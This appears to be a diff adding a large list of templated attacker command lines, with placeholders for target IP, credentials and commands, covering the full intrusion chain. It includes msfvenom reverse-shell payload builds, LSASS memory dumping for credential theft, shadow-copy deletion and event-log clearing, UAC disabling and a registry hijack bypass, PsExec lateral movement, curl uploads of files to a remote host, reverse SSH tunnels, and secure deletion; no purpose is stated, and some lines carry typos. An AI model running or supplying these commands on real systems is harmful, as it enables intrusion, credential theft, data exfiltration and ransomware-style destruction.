+powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s"
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
+powershell -c "psexec.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "mstsc.exe /v:${ip_address} /f"
+cmd /c "sdelete ${local_file_path}"
+cmd /c "wmic.exe os get Caption"
+cmd /c "choco install psexec"
 powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+cmd /c "wmic os get FreePhysicalMemory"
+choco install -y procdump
+choco install -y Megasync
+reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f
+cmd /c "sdelete -f -q ${loal_file_path}"
+powershell -c "choco install -f psexec"
+hostname
+cmd /c "sdelete.exe -q ${local_file_path}"
+7z a -slp ${destination_file_path} ${source_file_path} -p
+curl.exe -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
+taskkill.exe /F /IM ${process_name}
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
+cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+cat email.txt | sendmail ${username}@${domain}
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute}
+cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+powershell -c "taskkill /im ${process_name} /T"
+plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+procdump -mm lsass lsassdump.dmp
+powershell -c "wmic os get SystemDevice"
+powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "certutil -encode -Unicode error.txt encode.txt"
+powershell -c "7z a -slt -p ${destination_file_path} ${source_file_path}"
+powershell -c "sdelete.exe -s -accepteula ${local_file_path}"
+powershell -c "7z.exe a -p ${destination_file_path} ${source_file_path}"
+taskkill.exe /F /im ${process_name} /T
+wevtutil cl security
+vssadmin delete shadows /all
+powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+7z a ${destination_file_path} ${source_file_path} -p${password}
+powershell -c "vssadmin Delete Shadows /all"
+sdelete -f -accepteula ${local_file_path}
+powershell -c "certutil -encode ${source_file_path} ${destination_file_path}"
+cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d"
+wevtutil clear-log system
+cmd /c "mstsc.exe /v:${ip_address} /f /remoteGuard"
+powershell -c "wmic shadowcopy call create Volume=C:"
+powershell -c "mstsc /v:${ip_address} /f"
+tasklist
+powershell -c "procdump -mm lsass.exe lsassdump.dmp"
+powershell -c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+net stop ${service_name}
+wevtutil.exe cl security
+mstsc /v:${ip_address} /f /remoteGuard
+cmd /c "wevtutil cl security"
+powershell -c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+cmd /c "sdelete -s -accepteula ${local_file_path}"
+cmd /c "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "wmic os get Caption"
+powershell -c "vssadmin delete shadows /all"
+cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+taskkill /F /IM ${process_name}
+mstsc.exe /v:${ip_address} /f /remoteGuard
+mstsc /v:${ip_address}
+taskkill /im ${process_name} /T
+cmd /c "certutil -encode -gmt -v error.txt encode.txt"
+cmd /c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+nmap -p- ${ip_address}
+certutil -encode -gmt ${source_file_path} ${destination_file_path}
+cmd /c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "procdump.exe -ma lsass.exe lsassdump.dmp"
+powershell -c "wmic os get TotalVirtualMemorySize"
+psexec \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+cmd /c "procdump -accepteula -mm lsass.exe lsassdump.dmp"
+cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "certutil -encode -UnicodeText -v error.txt encode.txt"
+psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+del /p /q ${local_file_path}
+sdelete -s -accepteula ${local_file_path}
+cmd /c "plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+nmap -p- -sC -sV -O ${ip_address}
+certutil -encode -UnicodeText -v error.txt encode.txt
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} -a attachement.txt
+vssadmin delete shadows /All /quiet
+psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+ipconfig.exe /allcompartments
+powershell -c "vssadmin delete shadows /All /quiet"
+powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "wmic.exe os get Version"
+cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+nmap -sV ${ip_address} 2> error.log
+cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+wevtutil.exe cl application
+cmd /c "taskkill /F /IM ${process_name}"
+procdump.exe -mm lsass lsassdump.dmp
+plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+powershell -c "choco install Megasync"
+echo ${email_content} | sendmail ${username}@${domain}
+mstsc.exe /v:${ip_address} /remoteGuard
+nmap -sC ${ip_address}
+cmd /c "wevtutil clear-log security"
+powershell -c "7z.exe a -slt -p ${destination_file_path} ${source_file_path}"
+powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d"
+cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+echo -e ${email_content} | ssmtp ${username}@${domain} 2> /dev/null
+cmd /c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+netstat.exe -a
+cmd /c "wevtutil cl system"
+sc stop ${service_name}
+powershell -c "7z a ${destination_file_path} ${source_file_path} -p${password}"
+sdelete -f -q ${local_file_path}
+cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+cmd /c "vssadmin delete shadows /All"
+powershell -c "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "choco install -y ngrok"
+cmd /c "certutil -encode -Unicode -v error.txt encode.txt"
+cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+certutil -encode -gmt -f ${source_file_path} ${destination_file_path}
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f
+powershell -c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
+choco install procdump
+rm -r ${local_file_path} 2> /dev/null
+powershell -c "ipconfig.exe"
+powershell -c "certutil -encode -v error.txt encode.txt"
+rm -rf ${local_file_path} 2> &1
+cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+cat email.txt | mutt -s ${email_subject} ${username}@${domain}
+powershell -c "procdump.exe -ma lsass.exe lsassdump.dmp"
+powershell -c "Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "procdump.exe -mm lsass lsassdump.dmp"
+psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+powershell -c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+certutil -encode -UnicodeText error.txt encode.txt
+powershell -c "mstsc.exe /v:${ip_address} /f"
+certutil -encode -Unicode error.txt encode.txt
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+cmd /c "wevtutil.exe cl system"
+powershell -c "vssadmin delete shadows /all /quiet"
+cmd /c "mstsc /v:${ip_address} /f /admin"
+powershell -c "procdump.exe -mm lsass lsassdump.dmp"
+reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f
+wmic os get CSName
+rmdir /s ${local_file_path}
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+ipconfig.exe
+nmap -p- -sC -sV ${ip_address}
+powershell -c "certutil -encode -Unicode -v -f error.txt encode.txt"
+hostname.exe
+powershell -c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+cmd /c "del /q /p ${local_file_path}"
+choco install -f putty
+7z.exe a ${destination_file_path} ${source_file_path} -p
+powershell -c "certutil -encode -gmt -v -f error.txt encode.txt"
+cat email.txt | ssmtp ${username}@${domain} 2> &1
+cmd /c "7z a -slt ${destination_file_path} ${source_file_path} -p"
+cmd /c "netstat -r"
+powershell -c "procdump.exe -accepteula -ma lsass.exe lsassdump.dmp"
+wmic.exe os get CSName
+cmd /c "procdump -mm lsass.exe lsassdump.dmp"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+powershell -c "wmic.exe os get Version"
+wmic os get Caption,Version
+cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f"
+vssadmin delete shadows /all /Quiet
+powershell -c "taskkill.exe /F /im ${process_name} /T"
+vssadmin.exe delete shadows /All
+cmd /c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+procdump.exe -accepteula -ma lsass lsassdump.dmp
+cat email.txt | sendmail ${username}@${domain} 2> error.log
+cmd /c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+cmd /c "taskkill.exe /F /im ${process_name} /T"
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+cmd /c "7z a -slt -p ${destination_file_path} ${source_file_path}"
+vssadmin.exe delete shadows /All /quiet
+powershell -c "wmic.exe os get Name"
+cmd /c "arp -a"
+mail -s ${email_subject} ${username}@${domain} < mail.txt 2> error.log
+procdump -accepteula -mm lsass.exe lsassdump.dmp
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
+vssadmin delete shadows /All
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ"
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f
+nmap -p- ${ip_address} 2> &1
+cmd /c "netstat.exe -a"
+psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
+cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "7z a -p${password} ${destination_file_path} ${source_file_path}"
+ipconfig /all
+powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+taskkill.exe /im ${process_name}
+powershell -c "mstsc.exe /v:${ip_address} /f /admin"
+netstat -f
+powershell -c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "taskkill.exe /F /IM ${process_name}"
+msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "7z a -slt -p${password} ${destination_file_path} ${source_file_path}"
+powershell -c "choco install -f rclone"
+cmd /c "mstsc /v:${ip_address} /f /public"
+cmd /c "taskkill.exe /F /IM ${process_name}"
+powershell -c "mstsc.exe /v:${ip_address} /f /public"
+cmd /c "wevtutil clear-log application"
+wmic.exe shadowcopy call create Volume=C:
+cmd /c "netstat.exe -r"
+choco install -f psexec
+nmap -PN ${ip_address} 2> /dev/null
+wmic os get Caption
+psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
+cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+vssadmin.exe create shadow /for=C:
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ"
+cmd /c "wmic os get Version"
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain}
+powershell -c "7z.exe a -slt ${destination_file_path} ${source_file_path} -p"
+curl -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+cat email.txt | sendmail ${username}@${domain} 2> &1
+Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+powershell -c "netstat"
+taskkill.exe /F /im ${process_name}
+psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s
+cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+netstat.exe
+cmd /c "choco install procdump"
+cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+nmap -PN ${ip_address} 2> error.log
+mstsc /v:${ip_address} /admin
+cmd /c "sdelete -s ${local_file_path}"
+ipconfig
+procdump -ma lsass.exe lsassdump.dmp
+powershell -c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "netstat.exe -f"
+cmd /c "certutil -encode -Unicode -f error.txt encode.txt"
+7z.exe a ${destination_file_path} ${source_file_path} -p${password}
+cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+powershell -c "arp -a"
+cmd /c "sdelete -q -accepteula ${loal_file_path}"
+powershell -c "certutil -encode -UnicodeText error.txt encode.txt"
+nmap -p- -sC -sV -O -A ${ip_address} 2> error.log
+cat email.txt | sendmail ${username}@${domain} 2> /dev/null
+powershell -c "certutil -encode -Unicode -gmt error.txt encode.txt"
+Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d
+powershell -c "certutil -encode -UnicodeText -f error.txt encode.txt"
+vssadmin Delete Shadows /All
+cmd /c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
+cmd /c "choco install ngrok"
+cmd /c "ipconfig.exe /all"
+nmap -PN ${ip_address}
+Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+systeminfo.exe
+wevtutil cl application
+powershell -c "mstsc /v:${ip_address} /f /admin"
+7z a -slp -p ${destination_file_path} ${source_file_path}
+curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload
+cmd /c "mstsc.exe /v:${ip_address}"
+nmap -sV ${ip_address}
+certutil -encode -Unicode -v error.txt encode.txt
+powershell -c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
+choco install 7zip
+cmd /c "taskkill.exe /f /im ${process_name} /T"
+powershell -c "Psexec64.exe \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute}"
+cmd /c "reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD /d 0 /f"
+cmd /c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
+powershell -c "wmic.exe os get TotalVirtualMemorySize"
+cmd /c "plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "certutil -encode -gmt -v -f error.txt encode.txt"
+powershell -c "sc.exe stop ${service_name}"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+cmd /c "choco install -f putty"
+curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
+powershell -c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD_LITTLE_ENDIAN /d 0 /f"
+cat email.txt | mail -s ${email_subject} ${username}@${domain} 2> &1
+powershell -c "mstsc /v:${ip_address} /multimon"
+nmap -p- -sC ${ip_address} 2> error.log
+curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
+cmd /c "msfvenom -p windows/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> &1
+nmap -p- ${ip_address} 2> error.log
+nmap ${ip_address} 2> &1
+powershell -c "del /p ${local_file_path}"
+sdelete.exe -s -q -accepteula ${local_file_path}
+cmd /c "mstsc.exe /v:${ip_address} /admin"
+cmd /c "del /p ${local_file_path}"
+certutil -encode -Unicode -gmt -v -f error.txt encode.txt
+cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+cmd /c "wmic os get SystemDevice"
+systeminfo
+cmd /c "Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+choco install -f ngrok
+msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+vssadmin.exe Delete Shadows /All
+cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d"
+powershell -c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+wmic.exe os get Version
+powershell -c "taskkill.exe /f /im ${process_name} /T"
+mail -s ${email_subject} ${username}@${domain} < mail.txt 2> /dev/null
+cmd /c "taskkill /im ${process_name} /T"
+arp.exe -g
+cmd /c "certutil -encode -gmt ${source_file_path} ${destination_file_path}"
+rm -rf ${local_file_path} 2> /dev/null
+powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "ipconfig /all"
+powershell -c "choco install 7zip"
+cmd /c "7z a ${destination_file_path} ${source_file_path} -p${password}"
+cmd /c "del /f /p ${local_file_path}"
+powershell -c "plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+cmd /c "wmic.exe os get CSName"
+nmap -p- -sC ${ip_address} 2> &1
+plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+powershell -c "wevtutil clear-log system"
+nmap -A ${ip_address}
+7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
+powershell -c "plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+nmap --open ${ip_address} 2> error.log
+certutil -encode -UnicodeText -gmt -f error.txt encode.txt
+del ${local_file_path}
+cmd /c "7z a -slp -p ${destination_file_path} ${source_file_path}"
+msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+cmd /c "certutil -encode -UnicodeText error.txt encode.txt"
+powershell -c "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+nmap -T5 ${ip_address} 2> &1
+cmd /c "netstat -q"
+cmd /c "choco install -f ngrok"
+cmd /c "vssadmin delete shadows /All /quiet"
+powershell -c "certutil -encode -Unicode -v error.txt encode.txt"
+nmap -v -A ${ip_address} 2> &1
+powershell -c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+cmd /c "taskkill /f /im ${process_name} /T"
+Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -s
+mstsc /v:${ip_address} /f /admin
+cmd /c "rmdir /s ${local_file_path}"
+cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+powershell -c "del /f /p ${local_file_path}"
+Psexec64 \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+cmd /c "7z a -p${password} ${destination_file_path} ${source_file_path}"
+powershell -c "wmic os get Name"
+powershell -c "ipconfig /allcompartments"
+cmd /c "mstsc /v:${ip_address} /f /remoteGuard"
+cmd /c "systeminfo.exe"
+msfvenom -p windows/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+cmd /c "choco install -f 7zip"
+sc.exe stop ${service_name}
+certutil -encode -Unicode -gmt -f error.txt encode.txt
+del /f ${local_file_path}
+powershell -c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+nmap -sV ${ip_address} 2> /dev/null
+nmap -p- -sC -sV -O ${ip_address} 2> &1
+cmd /c "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
+wmic os get Name
+cmd /c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+cmd /c "certutil -encode -v error.txt encode.txt"
+reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ
+echo ${email_content} | mutt -s ${email_subject} ${username}@${domain} 2> &1
+mail -s ${email_subject} ${username}@${domain} < mail.txt
+taskkill /f /im ${process_name} /T
+powershell -c "netstat -f"
+nmap -p- ${ip_address} 2> /dev/null
+vssadmin Delete Shadows /All /quiet
+powershell -c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_MULTI_SZ /f
+powershell -c "mstsc /v:${ip_address} /admin"
+powershell -c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+certutil -encode -Unicode -f error.txt encode.txt
+mstsc /v:${ip_address} /f /restrictedAdmin
+Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}
+cmd /c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+cmd /c "systeminfo"
+powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+cmd /c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+cmd /c "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+nmap --open ${ip_address} 2> /dev/null
+cmd /c "choco install putty"
+cmd /c "sdelete.exe ${local_file_path}"
+cmd /c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+cmd /c "vssadmin.exe delete shadows /all"
+nmap -T5 ${ip_address} 2> error.log
+mstsc /v:${ip_address} /multimon
+cmd /c "7z a -p ${destination_file_path} ${source_file_path}"
+choco install -y psexec
+certutil -encode -f ${source_file_path} ${destination_file_path}
+powershell -c "choco install ngrok"
+powershell -c "certutil -encode -gmt -f ${source_file_path} ${destination_file_path}"
+powershell -c "del /f ${local_file_path}"
+powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "sdelete -f -accepteula ${local_file_path}"
+cmd /c "mstsc.exe /v:${ip_address} /f /restrictedAdmin"
+sendmail ${username}@${domain} < mail.txt
+plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+cmd /c "hostname"
+taskkill.exe /f /im ${process_name} /T
+plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+powershell -c "wevtutil.exe cl system"
+powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ /f"
+powershell -c "vssadmin.exe delete shadows /all"
+nmap -v ${ip_address} 2> /dev/null
+7z a -slt -p${password} ${destination_file_path} ${source_file_path}
+cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+7z a -slp ${destination_file_path} ${source_file_path} -p${password}
+cmd /c "mstsc /v:${ip_address}"
+powershell -c "7z a -slp -p${password} ${destination_file_path} ${source_file_path}"
+cmd /c "taskkill.exe /im ${process_name}"
+powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p${password}"
+cmd /c "wmic os get Name"
+cmd /c "procdump -mm lsass lsassdump.dmp"
+nmap -F ${ip_address} 2> error.log
+psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}
+powershell -c "reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_EXPAND_SZ /f"
+powershell -c "mstsc /v:${ip_address} /restrictedAdmin"
+nmap -v ${ip_address} 2> &1
+powershell -c "7z a ${destination_file_path} ${source_file_path} -p"
+mailx -s ${email_subject} ${username}@${domain} < mail.txt 2> &1
+taskkill /im ${process_name}
+wevtutil clear-log security
+Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s
+cmd /c "sdelete.exe -s ${local_file_path}"
+Psexec64.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+cmd /c "certutil -encode -f ${source_file_path} ${destination_file_path}"
+cmd /c "sdelete -f -accepteula ${local_file_path}"
+powershell -c "taskkill /F /im ${process_name}"
+cat email.txt | mutt -s ${email_subject} ${username}@${domain} 2> /dev/null
+certutil -encode -Unicode -gmt error.txt encode.txt
+powershell -c "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+powershell -c "psexec.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "netstat.exe"
+nmap -p- -sC -sV -O -A ${ip_address} 2> &1
+psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d
+powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}"
+cmd /c "procdump -accepteula -ma lsass lsassdump.dmp"
+echo ${email_content} | sendmail ${username}@${domain} 2> /dev/null
+wevtutil cl system
+cmd /c "procdump.exe -accepteula -mm lsass lsassdump.dmp"
+powershell -c "sdelete.exe -f -accepteula ${local_file_path}"
+cmd /c "taskkill /f /im ${process_name}"
+cmd /c "taskkill.exe /f /im ${process_name}"
+vssadmin delete shadows /All /Quiet
+powershell -c "certutil -encode -gmt -v error.txt encode.txt"
+rmdir /q /s ${local_file_path}
+cmd /c "psexec.exe \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}"
+powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+powershell -c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+cmd /c "vssadmin Delete Shadows /all /Quiet"
+cmd /c "hostname.exe"
+psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+rm -r ${local_file_path} 2> &1
+cmd /c "Psexec64.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute}"
+cmd /c "arp.exe -a"
